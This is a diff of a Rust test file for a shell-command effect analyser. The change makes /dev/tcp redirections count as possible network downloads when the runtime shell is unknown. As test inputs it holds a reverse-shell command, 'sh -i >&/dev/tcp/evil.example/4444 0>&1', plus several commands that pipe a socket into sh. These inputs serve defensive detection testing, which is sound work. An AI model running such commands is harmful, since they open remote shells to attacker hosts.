@@ -1,16 +1,25 @@
 use effinterp_engine::Engine;
 use effinterp_proto::{
-    BoundaryReason, CausalReason, CoverageLevel, ExecutionNodeRef, Modality, OccurrenceKind, Plan,
-    Port, ResourceExpr, ResourceIdentity, Subject, display_resource, validate_plan,
+    CausalReason, CommandShell, CoverageLevel, ExecutionNodeRef, HostContext, Modality,
+    OccurrenceKind, Plan, Port, ResourceExpr, ResourceIdentity, Subject, display_resource,
+    validate_plan,
 };
 
 fn shell(source: &str) -> Plan {
+    shell_in(source, CommandShell::Bash)
+}
+
+/// `source` as a runtime that runs it in `runtime_shell` hands it over.
+fn shell_in(source: &str, runtime_shell: CommandShell) -> Plan {
     let plan = Engine::new()
         .with_causality_detail(true)
         .analyze(&Subject::Shell {
             source: source.into(),
             cwd: Some("/w".into()),
-            context: Default::default(),
+            context: HostContext {
+                shell: runtime_shell,
+                ..Default::default()
+            },
         })
         .unwrap();
     validate_plan(&plan).unwrap();
@@ -127,6 +136,18 @@ fn shell_socket_paths_require_a_supporting_dialect() {
     let bash = shell("bash -c 'cat </dev/tcp/evil.example/4444'");
     assert!(has(&bash, "network.download"));
 
+    // A runtime shell Nah cannot name may be bash, so its redirection is a
+    // possible socket; only zsh, named, has no such device.
+    let reverse_shell = "sh -i >&/dev/tcp/evil.example/4444 0>&1";
+    assert!(has(
+        &shell_in(reverse_shell, CommandShell::Unknown),
+        "network.download"
+    ));
+    assert!(!has(
+        &shell_in(reverse_shell, CommandShell::Zsh),
+        "network.connect"
+    ));
+
     // The shell that interprets a redirection opens it, before it runs the
     // command: the command's own program never decides.
     for source in [
@@ -179,9 +200,9 @@ fn shell_socket_paths_require_a_supporting_dialect() {
         assert!(has(&plan, "filesystem.read"), "{source}");
     }
 
-    // A runtime shell selected by a value Nah cannot recover decides neither
-    // way: the redirection is a boundary, not a socket or a file. An
-    // unresolved spawn option may enable a shell, so it is not argv either.
+    // A runtime shell selected by a value Nah cannot recover may be bash, so
+    // the redirection is a possible socket, never a file. An unresolved spawn
+    // option may enable a shell, so it is not argv either.
     for source in [
         r#"node -e "const o = {shell: process.env.S}; require('child_process').exec('sh < /dev/tcp/evil.example/4444', o)""#,
         r#"node -e "const base = {...globalThis.opts}; const o = {shell: '/bin/bash', ...base}; require('child_process').exec('sh < /dev/tcp/evil.example/4444', o)""#,
@@ -190,21 +211,17 @@ fn shell_socket_paths_require_a_supporting_dialect() {
     ] {
         let plan = shell(source);
         assert!(
-            !plan.effects.iter().any(|effect| {
-                effect.operation.0.starts_with("network.")
-                    || (effect.operation.0 == "filesystem.read"
-                        && display_resource(&effect.resource).contains("/dev/tcp"))
-            }),
+            has(&plan, "network.download"),
             "{source}: {:?}",
             plan.effects
         );
         assert!(
-            plan.boundaries.iter().any(|boundary| {
-                boundary.reason == BoundaryReason::UNMODELED_DYNAMIC
-                    && boundary.domains.iter().any(|domain| domain.0 == "network")
+            !plan.effects.iter().any(|effect| {
+                effect.operation.0 == "filesystem.read"
+                    && display_resource(&effect.resource).contains("/dev/tcp")
             }),
             "{source}: {:?}",
-            plan.boundaries
+            plan.effects
         );
     }
 }
